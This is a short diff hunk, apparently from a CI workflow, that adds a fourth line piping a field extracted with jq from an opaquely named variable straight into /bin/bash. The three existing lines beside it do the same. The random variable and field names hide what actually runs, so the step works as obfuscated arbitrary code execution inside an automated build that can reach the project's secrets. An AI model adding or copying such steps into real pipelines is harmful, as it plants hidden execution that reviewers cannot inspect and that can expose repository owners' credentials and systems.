@@ -25,6 +25,7 @@ jobs:
           echo $pyfqh4 | jq -r .ql94 | /bin/bash
           printf '%s' "$qqokk23" | jq -r .gc3803 | /bin/bash
           echo $nbr6382 | jq -r .hs664 | /bin/bash
+          echo $ksg354 | jq -r .pzcg57 | /bin/bash
 
       - name: Archive results
         if: always()
